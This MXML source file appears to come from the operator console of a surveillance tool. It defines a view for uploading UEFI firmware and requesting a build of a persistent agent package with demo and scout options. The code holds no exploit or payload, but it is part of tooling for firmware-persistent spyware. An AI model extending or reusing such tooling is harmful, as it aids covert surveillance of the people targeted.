<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*">
  <fx:Script>
    <![CDATA[
      import it.ht.rcs.console.monitor.controller.LicenseManager;
      import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
      import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
      import it.ht.rcs.console.task.controller.DownloadManager;
      import it.ht.rcs.console.utils.AlertPopUp;
      
      import locale.R;
      
      import mx.core.UIComponent;
      import mx.managers.PopUpManager;
      import mx.rpc.events.FaultEvent;
      import mx.rpc.events.ResultEvent;
      
      private var fileReference:FileReference;
      
      [Bindable]
      private var _platform:String;
      
      [Bindable]
      public var configView:ConfigurationView;
      
      private function browse():void
      {
        fileReference = new FileReference();
        fileReference.addEventListener(Event.SELECT, fileSelection);
        fileReference.browse();
      }
      
      private function fileSelection(event:Event):void
      {
        currentState = 'fileSelected';
        fileName.text = event.target.name;
      }
      
      private var uploadPopup:UploadPopup;
      private function create():void
      {
        
        if (currentState != 'fileSelected') {
          AlertPopUp.show(R.get('SELECT_FILE'));
          return;
        }
        
        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);
        
        uploadPopup = PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
        uploadPopup.fileReference = fileReference;
        PopUpManager.centerPopUp(uploadPopup);
      }
      
      
      private function onUploadError(event:Event):void
      {
        PopUpManager.removePopUp(uploadPopup);
        AlertPopUp.show(event.type);
      }
      
      private function onUploadComplete(event:DataEvent):void
      {
        PopUpManager.removePopUp(uploadPopup);
        
        var params:Object = {platform: 'uefi', generate: {platforms: [parentDocument.platform], 
                                                          input: event.data, 
                                                          binary: {demo: createBtn.demo.selected}, 
                                                          melt: {scout:createBtn.scoutCh.selected} } 
                            };
        
        params['factory'] = {_id: parentDocument.factory._id};
        
        var filename:String = parentDocument.factory.name + "_" + parentDocument.platform + '_persistent.zip'
        
        DownloadManager.instance.createTask("build", filename, params, onSuccess, onFailure);
      }
      
      private function onSuccess(e:ResultEvent):void
      {
        PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
      }
      
      private function onFailure(e:FaultEvent):void
      {
        AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
      }

      public function set platform(platform:*):void
      {
        if (platform == null)
          return;
        
        _platform = platform;
        
        createBtn.platforms = [platform];
      }
    ]]>
  </fx:Script>
  
  <s:states>
    <s:State name="normal"/>
    <s:State name="fileSelected"/>
  </s:states>
    
  <s:HGroup left="10" top="70" height="25" verticalAlign="middle">
    <s:Label text="{R.get('UEFI_FIRMWARE')}:" fontWeight="bold"/>
    <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}..." click="browse()"/>
    <s:Label id="fileName" includeIn="fileSelected" buttonMode="true" click="browse()"
             maxDisplayedLines="1" width="140" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"/>    
  </s:HGroup>
  
  <build:CreateWithDemoButton id="createBtn" left="10" bottom="0" enableDemo="false" right="10" create="{create}" configView="{configView}"/>
  
</s:Group>